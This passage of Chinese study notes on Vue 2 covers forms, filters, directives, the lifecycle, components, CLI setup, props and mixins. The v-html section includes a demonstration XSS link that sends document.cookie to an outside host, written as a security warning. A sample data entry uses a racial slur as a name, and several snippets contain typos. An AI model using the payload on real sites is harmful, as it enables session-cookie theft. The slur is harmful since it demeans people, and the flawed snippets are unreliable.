                    { id: 003, name: '小狗', age: 20 },
                ],
            },
            methods: {
                addOne() {
                    const p = { id: 004, name: '黑鬼', age: 21 }
                    this.persons.unshift(p)
                }
            },
        })
    </script>
</body>
```



### ③列表过滤

下面还有很多内容，先进行过滤，比赛回来再进行学习











## 13	收集表单数据

```html
<body>
    <!-- 
        收集表单数据：
            若：<input type="text"/>，则v-model收集的是value值，用户输入的就是value值。
            若：<input type="number">，输入框只能输入数字，e也是数字，一个无理数
            若：<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。
            若：<input type="checkbox"/>
                1.没有配置input的value属性，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                2.配置input的value属性:
                    (1)v-model的初始值是非数组，那么收集的就是checked（勾选 or 未勾选，是布尔值）
                    (2)v-model的初始值是数组，那么收集的的就是value组成的数组

            v-model的三个修饰符：
                lazy：失去焦点再收集数据
                number：输入字符串转为有效的数字
                trim：输入首尾空格过滤
    -->
    <div id="root">
        <!-- prevent修饰符：阻止默认事件 -->
        <form @submit.prevent="demo">
            账号 <input type="text" v-model.trim="userInfo.account"><br><br>
            密码 <input type="password" v-model='userInfo.password'><br><br>
            年龄 <input type="number" v-model.number="userInfo.age"><br><br>
            性别 
            男<input type="radio" name="sex" value="boy" v-model="userInfo.sex">
            女<input type="radio" name="sex" value="girl" v-model="userInfo.sex"><br><br>
            爱好
            学习<input type="checkbox" value="study" v-model="userInfo.hobby">
            打游戏<input type="checkbox" value="game" v-model="userInfo.hobby">
            追剧<input type="checkbox" value="watch" v-model="userInfo.hobby"><br><br>
            所属校区
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="guangzhou">广州</option>
                <option value="shanghai">上海</option>
            </select><br><br>
            其他信息：
            <textarea v-model="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree"><a href="https://www.baidu.com">阅读并接受</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        Vue.config.productionTip = false         
        const vm = new Vue({
            el: "#root",
            data: {
                userInfo: {                     
					account:'',
					password:'',
					age:18,
					sex:'boy',
					hobby:[],
					city:'beijing',
					other:'',
					agree:''
                }
            },
            methods: {
                demo(){
                    console.log(JSON.stringify(this.userInfo))
                }
            },
        })
    </script>
</body>
```





## 14	过滤器

```html
<body>
    <!-- 
        过滤器：
            定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。
            语法：
                1.注册过滤器
                    全局过滤器（所有vm都可以使用）：Vue.filter(name,callback)
                    局部过滤器：new Vue{filters:{}}(只能内部使用)
                2.使用过滤器：{{ xxx | 过滤器名}}  或  v-bind:属性 = "xxx | 过滤器名"
            备注：
                1.过滤器也可以接收额外参数
                2.可以使用多个过滤器，按顺序执行，执行完将返回的值传给下一个过滤器
                3.过滤器并没有改变原本的数据, 是产生新的对应的数据
	-->
    <div id="root">
        <h2>当前时间: {{time}}</h2>
        <!-- 计算属性实现时间格式化 -->
        <h3>格式化后: {{timeFormat}}</h3>
        <!-- methods实现时间格式化 -->
        <h3>格式化后: {{getFormatTime()}}</h3>
        <!-- 过滤器实现时间格式化 -->
        <h3>格式化后: {{time | timeFormat('YYYY-MM-DD')}}</h3>
        <!-- 执行多个过滤器 -->
        <h3>格式化后: {{time | timeFormat('YYYY-MM-DD') | mySlice}}</h3>
        <!-- 使用全局过滤器 -->
        <h3 :x='msg | allSlice'>1</h3>
    </div>
    <div id="root2">
        <!-- 使用全局过滤器 -->
        <h3 :x='msg | allSlice'>1</h3>
    </div>
    <script>
        Vue.config.productionTip = false
        // 定义一个全局的过滤器
        Vue.filter('allSlice', function (value) {
            return value.slice(0, 4)
        })
        const vm = new Vue({
            el: "#root",
            data: {
                time: Date.now(),
                msg: '欢迎来到中国'
            },
            methods: {
                getFormatTime() {
                    return dayjs(this.time).format('YYYY月MM日DD HH:mm:ss')
                }
            },
            computed: {
                timeFormat() {
                    return dayjs(this.time).format('YYYY月MM日DD HH:mm:ss')
                }
            },
            // 局部过滤器
            filters: {
                timeFormat(value, str) {
                    return dayjs(value).format(str)
                },
                // 只要前四个字符
                mySlice(value) {
                    // slice --> 切片
                    return value.slice(0, 4)
                }
            }
        })
        // 定义第二个vm
        new Vue({
            el: "#root2",
            data: {
                msg: "welcome from china"
            }
        })
    </script>
</body>
```





## 15	内置指令

### ①v-text指令

```html
<body>
    <!-- 				
        v-text指令：
            1.作用：向其所在的节点中渲染文本内容。
            2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
    -->
    <div id="root">
        <!-- v-test -->
        <h1 v-text="name"></h1>
        <h1>您好，{{name}}</h1>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                name: "迪迦奥特曼"
            }
        })
    </script>
</body>
```



### ②v-html指令

```html
<body>
    <!-- 
        v-html指令：
            1.作用：向指定节点中渲染包含html结构的内容。
            2.与插值语法的区别：
                (1).v-html会替换掉节点中所有的内容，{{xx}}则不会。
                (2).v-html可以识别html结构。
            3.严重注意：v-html有安全性问题！！！！
                (1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
                    xss攻击：模仿用户行为，比如拿到存在浏览器上的cookie来绕过登录验证
                (2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！
            补充：可以设置cookie的HttpOnly属性来防止xss攻击，这个属性就是只能Http请求的时候才能取出来
	-->
    <div id="root">
        <div v-html="msg"></div>
        <div v-html="str"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        const vm = new Vue({
            el: "#root",
            data: {
                msg: "<h3>我是靓仔智</h3>",
                /* 
                    演示危险行为
                        设置：
                            这里在浏览器手动设置两个cookie值，分别是a=1,b=2
                            通过document.cookie可以得到HttpOnly=false的cookie值
                        注意：javascript:location.href='xxx?'+document.cookie中的“+”两边不能有空格，有的话就不能执行
                */
                str: "<a href=javascript:location.href='https://www.baidu.com?'+document.cookie>哥们，我这里有好看的</a>"
            }
        })
    </script>
</body>
```



### ③c-cloak指令

```html
<body>
    <!-- 
        v-cloak指令（没有值）：
            1.本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
            2.使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
                解释：就是由于网速慢，js加载慢，vue实例就不能被创建，所以模板未能被渲染
                解决：使用v-cloak指令和css来解决，css可以这样设置 -> [v-cloak]{display:none},
                      当模板渲染的时候就会删除掉v-cloak属性，从而解决模板未经渲染的问题
	-->
    <div id="root">
        <h2>Welcome from {{name}}</h2>
    </div>
</body>
<script>
    // 关闭生产提示
    Vue.config.productionTip = false
    const vm = new Vue({
        el: "#root",
        data: {
            name: "王者荣耀"
        },
    })
</script>
```



### ④v-once指令

```html
<body>
    <!-- 
        v-once指令：
            1.v-once所在节点在初次动态渲染后，就视为静态内容了(就是不会发生变化的内容)。
            2.以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
	-->
    <div id="root">
        <h2 v-once>初始的n值为：{{n}}</h2>
        <h2>变化的n值：{{n}}</h2>
        <button @click='n++'>n++</button>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: "#root",
        data: {
            n: 1
        },
    })
</script>
```



### ⑤v-pre指令

```html
<body>
    <!-- 
        v-pre指令：
            1.跳过其所在节点的编译过程（就是不进行渲染，直接跳过，如果是有插值语法的，最终就展示在页面上）。
            2.可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
    -->
    <div id="root">
        <h2 v-pre>欢迎来到中国</h2>
        <h2 v-pre>welcome from {{country}}</h2>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        data: {
            country: "china"
        },
    })
</script>
```



## 16	自定义指令

暂时略过







## 17	vue实例声明周期

### ①介绍声明周期

```html
<body>
    <dvi id="root">
        <h2 :style="{opacity}">学习vue</h2>
    </dvi>
</body>
<script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        data: {
            opacity: 1
        },
        // vue在完成模板解析把真实的dom放入页面后（挂载完成）调用mounted
        mounted() {
            console.log('mounted', this);
            // setInterval(定时器) --> 无限循环，每一次循环16次
            setInterval(() => {
                this.opacity -= 0.01
                if (this.opacity <= 0) this.opacity = 1
            }, 16)
        }
    })
    // 通过外部定时器实现(不推荐)
    // setInterval(() => {
    //     vm.opacity -= 0.01
    //     if (vm.opacity <= 0) vm.opacity = 1
    // }, 16)  
</script>
```



### ②分析生命周期

![生命周期](D:\学习笔记\img\20211124193619.png)

```html
<body>
    <!--
        template: 
            1.可以直接使用template来进行页面渲染，它会将容器完全替换
            2.template要使用换行的话可以使用es6的字符串
        声明周期：
            首先创建数据监控和数据代理  
            -> 将内存中的虚拟DOM转为真实DOM插入页面
            -> 数据发生改变，进行数据比较，完成页面更新
     -->
    <div id="root">
        <h2 v-text="n"></h2>
        <h2>当前的n值是：{{n}}</h2>
        <button @click='add'>点我n+1</button>
    </div>
</body>
<script>
    //阻止 vue 在启动时生成生产提示。
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#root',
        // template:`
        // 	<div>
        // 		<h2>当前的n值是：{{n}}</h2>
        // 		<button @click="add">点我n+1</button>
        // 	</div>
        // `,
        data: {
            n: 1
        },
        methods: {
            add() {
                console.log('add');
                this.n++
            }
        },
        beforeCreate() {
            console.log('beforeCreate')
        },
        created() {
            console.log('created');
        },
        beforeMount() {
            console.log('beforeMount')
        },
        mounted() {
            console.log('mounted')
        },
        beforeCreate() {
            console.log('beforeCreate');
        },
        updated() {
            console.log('updated')
        },
        beforeDestroy() {
            console.log('beforeDestroy')
        },
        destroyed() {
            console.log('destroyed')
        },
    })
</script>
```



### ③总结声明周期

```html
<!-- 
    常用的生命周期钩子：
        1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。
        2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。

    关于销毁Vue实例
        1.销毁后借助Vue开发者工具看不到任何信息。
        2.销毁后自定义事件会失效，但原生DOM事件依然有效。
        3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。
-->
```



 

# 二、vue组件化编程

## 1	组件概述

### ①模块

1. 理解: 向外提供特定功能的 js 程序, 一般就是一个 js 文件
2. 为什么: js 文件很多很复杂
3. 作用: 复用 js, 简化 js 的编写, 提高 js 运行效率



### ②组件

1. 理解: 用来实现局部(特定)功能效果的代码集合(html/css/js/image…..)
2. 为什么: 一个界面的功能很复杂
2. 作用: 复用编码, 简化项目编码, 提高运行效率



### ③模块化

当应用中的 js 都以模块来编写的, 那这个应用就是一个模块化的应用。



### ④组件化

当应用中的功能都是多组件的方式来编写的, 那这个应用就是一个组件化的应用,。





## 2	非单文件组件

### ①基本使用

```html
<body>
    <!-- 
        Vue中使用组件的三大步骤：
            一、定义组件(创建组件)
            二、注册组件
            三、使用组件(写组件标签)

        一、如何定义一个组件？
            使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；
            区别如下：
                1.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
                2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。
                  如果data写成对象，当组件复用的时候，一个组件改变了data，那么使用这个组件的地方都要发生变化
				 写成方法的话就不会有这个问题，因为每次调用方法都会重新开辟一个栈
            备注：使用template可以配置组件结构。

        二、如何注册组件？
            1.局部注册：靠new Vue的时候传入components选项
            2.全局注册：靠Vue.component('组件名',组件)

        三、编写组件标签：
            <school></school>
    -->
    <div id="root">
        <hello></hello>
        <hr>
        <!-- 3 使用组件 -->
        <school></school>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    // 1 创建两个组件 --> school组件和student组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{schoolName}}</h2>
                <h2>学校地点：{{address}}</h2>
            </div>
        `,
        data() {
            return {
                schoolName: '社会大学',
                address: '社会',
            }
        }
    })
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{studentName}}</h2>
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {
                studentName: '小智',
                age: 18,
            }
        }
    })
    const hello = Vue.extend({
        template: `
            <div>
                <h2>{{msg}}</h2>    
            </div>
        `,
        data() {
            return {
                msg: '你好啊'
            }
        }
    })
    // 全局注册组件
    Vue.component('hello', hello)
    const vm = new Vue({
        el: '#root',
        // 2 注册组件 --> components中注册，k-v的形式，k是组件名，v是主键的变量名
        components: {   // 局部组件
            // k和v同名可以直接写成一个
            // school
            school: school,
            student: student,
        }
    })
</script>
```

![image-20211124223355962](D:\学习笔记\img\20211124223357.png)



### ②注意点

```html
<body>
    <!-- 
        几个注意点：
            1.关于组件名:
                一个单词组成：
                    第一种写法(首字母小写)：school
                    第二种写法(首字母大写)：School
                多个单词组成：
                    第一种写法(kebab-case命名)：my-school
                    第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)
                备注：
                    (1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。
                    (2).可以使用name配置项指定组件在开发者工具中呈现的名字。

            2.关于组件标签:
                第一种写法：<school></school>
                第二种写法：<school/>
                备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。
                     后续组件也就是再次使用school组件

            3.一个简写方式：
                const school = Vue.extend(options) 可简写为：const school = options
    -->
    <div id="root">
        <school></school>
        <hr>
        <school2></school2>
    </div>
</body>
<script>
    Vue.config.productionTip = false

    // 定义组件
    const school = Vue.extend({
        template: `
        <div>
            <h2>学校名称：{{name}}</h2>
            <h2>学校地点：{{address}}</h2>
        </div>
    `,
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        }
    })

    // 组件的简写形式 --> 不用Vue.extend，直接是创建一个对象
    const school2 = {
        template: `
        <div>
            <h2>学校名称：{{name}}</h2>
            <h2>学校地点：{{address}}</h2>
        </div>
    `,
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        }
    }

    const vm = new Vue({
        el: "#root",
        // 注册组件
        components: {
            school: school
        },
    })
</script>
```

 

### ③组件的嵌套

```html
<body>
    <div id="root">

    </div>
</body>
<script>
    Vue.config.productionTip = false
    // 定义一个student组件
    const student = Vue.extend({
        template: `
            <div>
                <h2>学生姓名：{{name}}</h2>    
                <h2>学生年龄：{{age}}</h2>
            </div>
        `,
        data() {
            return {
                name: '法外狂徒-张三',
                age: 18
            }
        }
    })
    // 定义一个school，school中嵌套student组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>    
                <h2>学校地址：{{address}}</h2>
                <student></student>
            </div>
        `,
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        },
        // 在组件内注册组件 --> 套娃
        components: {
            student: student
        }
    })

    const hello = Vue.extend({
        template: `
            <div>
                <h2>{{msg}}</h2>    
            </div>
        `,
        data() {
            return {
                msg: '你好哇！！！',
            }
        },
    })

    // 定义一个app组件 --> 管理所有的子组件
    const app = Vue.extend({
        template: `
            <div>
                <school></school>
                <hello></hello>
            </div>
        `,
        // 在组件内注册组件 --> 套娃
        components: {
            school: school,
            hello: hello,
        }
    })

    const vm = new Vue({
        template: `<app></app>`,
        el: "#root",
        components: {
            app: app,
        }
    })
</script>
```

![image-20211126122155761](D:\学习笔记\img\20211126122157.png)



### ④VueComponent

```html
<body>
    <!-- 
        关于VueComponent：
            1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。

            2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，
                即Vue帮我们执行的：new VueComponent(options)。

            3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
                这个就相当于是每次调用Vue.extend就重新new一个VueComponent

            4.关于this指向：
                (1).组件配置中：
                    data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
                (2).new Vue(options)配置中：
                    data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。

            5.VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
                Vue的实例对象，以后简称vm。
    -->
    <div id="root">
        <school></school>
        <hello></hello>
    </div>
</body>
<script>
    Vue.config.productionTip = false

    const student = Vue.extend({
        template: `
            <div>
                <h2>学生名字：{{name}}</h2>    
                <h2>学生年龄：{{age}}</h2>    
            </div>
        `,
        data() {
            return {
                name: '张三',
                age: 18,
            }
        }
    })

    // 创建school组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>    
                <h2>学校地点：{{address}}</h2>    
                <student></student>
            </div>
        `,
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        },
        components: { student }
    })

    const hello = Vue.extend({
        template: `
            <div>
                <h2>{{msg}}</h2>
                <button @click='showInfo'>点我提示信息</button>
            </div>
        `,
        data() {
            return { msg: "你好哇!!!" }
        },
        methods: {
            showInfo() {
                // 输出的是VueComponent对象，也就死组件实例对象
                console.log(this);
            }
        }
    })

    const vm = new Vue({
        el: '#root',
        components: { school, hello },
    })
    // console.log(vm);
    // console.log('@', school);   // 返回的是一个名为VueComponent的构造函数
</script>
```

**源码中Vue.extend()调用了VueComponent来创建VueComponent对象**

![image-20211126145346044](D:\学习笔记\img\20211126145347.png)

**vm和组件之间的关系 --> vm是老大哥，组件是小弟们，他们的功能几乎一样，但是又有不同**

![image-20211126153225100](D:\学习笔记\img\20211126153226.png)

![image-20211126145935689](D:\学习笔记\img\20211126145936.png)





### ⑤一个重要的内置关系(半懂)

```html
<body>
    <!-- 
        1.一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
        2.为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。
        总的来说：就是组件实例对象可以访问到Vue原型上的属性、方法
    -->
    <div id="root">
        <school></school>
    </div>
</body>
<script>
    Vue.config.productionTip = false
    Vue.prototype.x = 99
    // 创建school组件
    const school = Vue.extend({
        template: `
            <div>
                <h2>学校名称：{{name}}</h2>    
                <h2>学校地点：{{address}}</h2>    
            </div>
        `,
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        },
    })
    // 输出school组件对象
    console.dir(school);
    const vm = new Vue({
        el: '#root',
        components: { school },
    })

    // 定义一个构造函数
    function Demo() {
        this.a = 1
        this.b = 2
    }
    // // 创建一个Demo的实例对象
    // const d = new Demo()
    // // 输出显性属性
    // console.log(Demo.prototype);
    // // 输出隐形属性
    // console.log(d.__proto__);
    // console.log(Demo.prototype == d.__proto__);

    // // 程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
    // Demo.prototype.x = 99
    // console.log('@', d);
</script>
```







## 3	单文件组件

1.  组件文件School.vue

    ```html
    <template>
        <div>
            <h2>学校名称：{{name}}</h2>
            <h2>学校地址：{{address}}</h2>
        </div>
    </template>
    
    <script>
    import student from './Student';
    // es6的语法 --> 我们之前说过，可以直接写一个对象
    export default {
        data() {
            return {
                name: '社会大学',
                address: '社会',
            }
        },
        components: {
            student
        },
    };
    </script>
    <style>
    
    /* style标签如果不需要可以删除 */
    </style>
    ```

2.  组件文件Student.vue

    ```html
    <template>
        <div>
            <h2>学生姓名：{{name}}</h2>
            <h2>学生年龄：{{age}}</h2>
        </div>
    </template>
    
    <script>
    import student from './Student';
    // es6的语法 --> 我们之前说过，可以直接写一个对象
    export default {
        data() {
            return {
                name: '社会大学',
                age: 18,
            }
        },
        comments: {
            student
        }
    };
    </script>
    ```

3.  组件文件App.vue

    ```html
    <template>
        <div>
            <School></School>
            <Student></Student>
        </div>
    </template>
    
    <script>
    import School from './School.vue';
    import Student from './Student.vue';
    // es6的语法 --> 我们之前说过，可以直接写一个对象
    export default {
        components: {School, Student},
    };
    </script>
    ```

4.  main.js文件 --> 负责创建vue实例

    ```js
    // 程序的入口
    import App from './App'
    new Vue({
        template: `<App></App>`,
        el: '#root',
        components: {App}
    })
    ```

5.  index.html文件  --> 创建容器

    ```html
    <body>
        <div id="root">
    
        </div>
        <!-- 在容器下面引入，因为可能会有延迟加载的问题 -->
        <script src="../js/vue.js"></script>
        <script src="./main,.js"></script>
    </body>
    ```





# 三、使用Vue脚手架

脚手架的作用就是帮我们编译.vue的文件，编译成浏览器支持的js、css、html文件





## 1	初始化脚手架

### ①说明

1.   Vue 脚手架是 Vue 官方提供的标准化开发工具（开发平台）。 

2.   目前最新的版本是 4.x。 

3.   文档: https://cli.vuejs.org/zh/。



### ②初始化步骤

```shell
# 第一步（仅一次执行）：全局安装@Vue/cli
npm install -g @vue/cli
# 第二步：切换到要创建项目的目录，然后使用命令创建项目
vue create xxxx
# 第三部：启动项目
npm run serve
```

**备注**：

-   如果出现下载速度缓慢的情况，可以更换镜像

    ```shell
    npm config set registry https://registry.npm.taobao.org
    ```



### ③模板项目结构

```properties
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   │── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
├── package-lock.json：包版本控制文件
```



**index.html文件说明**

```html
<!DOCTYPE html>
<html lang="">
  <head>
    <meta charset="utf-8">
    <!-- 针对IE的一个特殊设置，告诉IE浏览器，以最高的渲染等级进行渲染 -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- 开启移动端的理想视口 -->
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <!-- 配置页签图标 -->
    <link rel="icon" href="<%= BASE_URL %>favicon.ico">
    <!-- 配置网页标题 -->
    <title><%= htmlWebpackPlugin.options.title %></title>
  </head>
  <body>
    <!-- 当浏览器不支持js时，noscript中的元素就会被渲染 -->
    <noscript>
      <strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    </noscript>
    <!-- 容器 -->
    <div id="app"></div>
    <!-- built files will be auto injected -->
  </body>
</html>
```

**和我们之前的定义不同，看脚手架的main.js**

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

new Vue({
  // 这个render函数是什么呢，下面讲解
  render: h => h(App),
}).$mount('#app')
```



### ④分析render函数

```js
import Vue from 'vue'
import App from './App.vue'

Vue.config.productionTip = false

/* 
  关于不同版本的vue
    1.vue.js与vue.runtime.xxx.js的区别
      (1) vue.js是完整版的vue，包含：核心功能和模板解析器
      (2) vue.runtime.xxx.js是运行版的vue，只包含核心功能，没有模板解析器
    
    2.因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，
      需要使用render函数接收到的createElement函数去指定具体内容

  vue-cli脚手架默认导入的是vue.runtime.xxx.js，也就是运行版的vue，所以需要使用render函数
*/
new Vue({
  // render函数原来的形式
  // render(createElement) {
  //   // 参数1是元素名，参数2是内容
  //   return createElement('h1', '你好啊')
  // }
  // 简写形式
  render: h => h(App),
}).$mount('#app')
```



### ⑤修改默认配置

首先我们要知道，在vue-cli脚手架中那些是不能被修改的

![image-20211127205901443](D:\学习笔记\img\20211127205903.png)

**查看默认配置**：

```js
// Vue 脚手架隐藏了所有 webpack 相关的配置，若想查看具体的 webpakc 配置， 
// 请执行：vue inspect > output.js
```

![image-20211127214615008](D:\学习笔记\img\20211127214616.png)



**需求**：将vue-cli脚手架的默认入口`main.js`改成`hello.js`

我们可以在根节点下创建vue.config.js文件，里面是放我们的配置项，这些配置项是使用n.js的语法去写的，因为要交给webpack，webpack又是运行在node.js上的

==vue-cli的配置项在官网上有对应的解释，需要的时候去查找即可==

**代码实现**

vue.config.js

```js
module.exports = {
    pages: {
        index: {
            // 配置项里面一定要写东西，不然会报错！！！
            // 入口
            entry: 'src/hello.js',
        }
    }
}
```



**问题**：vue-cli默认是会有语法检查，当我们写一个变量，但是我们没有去调用，它就会报错，说没有被引用

**解决**：使用lintOnSave配置项来解决这个问题

**代码实现**

```js
module.exports = {
    pages: {
        index: {
            // page 的入口
            entry: 'src/hello.js',
        }
    },
    lintOnSave: false   // 关闭语法检查
}
```





## 2	ref属性

1. 被用来给元素或子组件注册引用信息（id的替代者）
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
3. 使用方式：
    1. 打标识：```<h1 ref="xxx">.....</h1>``` 或 ```<School ref="xxx"></School>```
    2. 获取：```this.$refs.xxx```

**总而言之**：ref属性就是vue提供的一种获取真实DOM元素的方式

**代码实现**

```vue
<template>
  <div>
    <h1 ref="title">{{msg}}</h1>
    <button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
    <School ref="sch"/>
  </div>
</template>

<script>
import School from "./components/School.vue";
export default {
  name: "App",
  components: { School },
  data() {
    return {
      msg: '您好哇！！！',
    }
  },
  methods: {
    showDOM() {
      // 以往的方式 ——> 使用document来获取DOM对象
      // console.log(document.getElementById('title'))
      // 现在vue提供了一个ref属性来让我们获取真实DOM元素
      console.log(this.$refs.title);  // 真实DOM元素
      console.log(this.$refs.btn);    // 真实DOM元素
      console.log(this.$refs.sch);    // School组件的实例对象（vc）
      // 获取到School组件的实例对象(vc)我们就可以做组件间数据访问了
      console.log(this);
    }
  },
};
</script>
```

![image-20211127221025566](D:\学习笔记\img\20211127221026.png)





## 3	props配置项

### ①介绍

**概述**：就是当我们复用组件的时候，里面的数据不一致时，我们需要进行数据的变化，需要props来实现

1. **功能**：让组件接收外部传过来的数据

2. **传递数据**：通过标签属性来进行传递

    `<demo name='a' age="18">`中的name和age中的值就是传递过去的值

3. **接收数据**

    -   第一种方式（只接收）

        ```js
        props: ['name','age']
        ```

    -   第二种方式（限制类型）：

        ```js
        props: {
        	name: String,
        	age: Number,
        }
        ```

    -   第三种方式（限制类型，指定默认值，必要性）

        ```js
        props: {
        	name: {
                type: xxx,
                required: true,	// 属性是必要的
                default: 默认值,
            }
        }
        ```



### ②代码实现

**创建组件时配置props配置**

```vue
<template>
  <div>
      <h1>{{msg}}</h1>
      <h2>学生姓名：{{name}}</h2>
      <h2>学生性别：{{sex}}</h2>
      <h2>学生年龄：{{age}}</h2>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            msg: '欢迎来到社会大学',
        }
    },
    // 第一种方式（只接收）
    // props: ['name', 'age', 'sex']

    // 第二种方式（限制类型）
    // props: {
    //     name: String,
    //     sex: String,
    //     age: Number,
    // }

    // 第三种方式（限制类型、指定默认值、设置必要性） --> 必要性就是指属性必须传过来，没有就报错
    props: {
        name: {
            required: true, // name是必要的
            type: String,   // 指定类型
        },
        age: {
            type: Number,
            default: 99,
        },
        sex: {
            type: String,
            default: '男',
        }
    }
}
</script>
```

**使用组件并传值**

```vue
<template>
	<div>
    <!-- 
      通过v-bind绑定属性可以在里面写表达式 -> 这样返回的值就不是字符串类型的了 
    -->
    <School name="小黑" sex="男" :age="18"/>
    <!-- 
      name不传会报错 -> [Vue warn]: Missing required prop: "name" 
    -->
    <!-- <School sex="男" :age="18"/> -->
	</div>
</template>
```

==**注意**：props是只读的，Vue底层会监测你对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。==



### ③实现修改props

```vue
<template>
  <div>
      <h2>学生年龄：{{myAge}}</h2>
      <button @click="changeAge">点我年龄+1</button>
  </div>
</template>

<script>
export default {
    name: 'School',
    data() {
        return {
            msg: '欢迎来到社会大学',
            myAge: this.age
        }
    },
    methods: {
        changeAge() {
            this.myAge++
        }
    },
    props: ['age'],
}
```





## 4	mixin（混入）

### ①说明

这个配置项的用处就是当多个组件共用的配置项提取成一个混入对象

**使用方式**：

-   第一步定义混入：

    ```js
    {
        data(){...},
        methods:{...},
        ....
    }
    ```

-   第二步使用混入：

    全局混入：`Vue.minin(xxx)`，所有组件都会使用到这个混入，这就是所有组件都使用这个共用的配置项

    局部混入：`mixins:['xxx']	`，使用的组件会有混入的配置项



### ②局部引入

**说明**：局部引入就是引入mixin文件的组件会使用到其中的配置项

创建一个js文件，名字叫什么都可以，在这里就叫`mixin.js`，里面是我们的配置项，这里以methods配置项为例

```js
// 文件名可以自定义，叫什么都可以
// 可以放入多个配置项
export const mixin = {
    methods: {
        showName() {
            alert(this.name)
        }
    },
    
}
```

然后在两个组件中引入，然后查看结果

```vue
<template>
  <div>
      <h2 @click='showName'>学校名称：{{name}}</h2>
      <h2>学校地址：{{address}}</h2>
  </div>
</template>

<script>
import {mixin} from '../mixin'

export default {
    name: 'School',
    data() {
        return {
            name: '社会大学',
            address: "社会",
        }
    },
    // 使用mixin
    mixins: [mixin]
}
</script>
```

```vue
<template>
  <div>
      <h2 @click="showName">学生姓名：{{name}}</h2>
      <h2>学生年龄：{{age}}</h2>
  </div>
</template>

<script>
// 暴露什么名就写什么名
import {mixin} from '../mixin'
export default {
    name: 'School',
    data() {
        return {
            name: '小智',
            age: 18,
        }
    },
    // 使用mixin
    mixins: [mixin,]
}
</script>
```



### ③全局引入

就是所有的组件都会使用到mixin中的配置项

```js
import mixin from './mixin'
// 引入全局的mixin
Vue.mixin(mixin)
```

这样，所有组件都会有mixin中的配置项的内容了



### ④细节

**问题**：在混入文件中的配置项和组件中存在相同的配置项，使用的是谁的，是组件的还是配置项的

**实验**：在组件和混入文件中都添加一个生命周期的钩子函数，看执行的次数

**结果**：它是会使用组件中的配置项，而不会使用混入文件中的配置项，==**唯一不同的就是生命周期的钩子函数它是都会执行，就是说在组件中的和混入中的都会执行！！！**==





## 5	插件

### ①说明

1. 功能：用于增强Vue

2. 本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。
